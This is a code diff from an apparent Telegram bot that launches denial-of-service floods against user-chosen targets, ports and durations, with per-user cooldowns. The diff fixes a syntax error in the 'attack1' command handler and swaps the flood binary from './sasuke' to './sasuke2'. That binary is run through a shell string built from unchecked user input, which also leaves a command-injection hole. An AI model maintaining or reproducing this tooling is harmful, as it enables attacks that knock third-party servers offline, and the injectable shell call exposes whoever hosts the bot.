@@ -225,7 +225,7 @@ def start_attack_reply(message, target, port, time):
     bot.reply_to(message, response)
 
 # Bot Command Handler For attack1
-@bot.message_handler(commands=['attack1])
+@bot.message_handler(commands=['attack1'])
 def handle_attack(message):
     user_id = str(message.chat.id)
     
@@ -258,7 +258,7 @@ def handle_attack(message):
                 # Set the cooldown start time
                 bgmi_cooldown[user_id] = datetime.datetime.now()
                 
-                full_command = f"./sasuke {target} {port} {time}"
+                full_command = f"./sasuke2 {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 
                 # Reset cooldown after the attack is finished
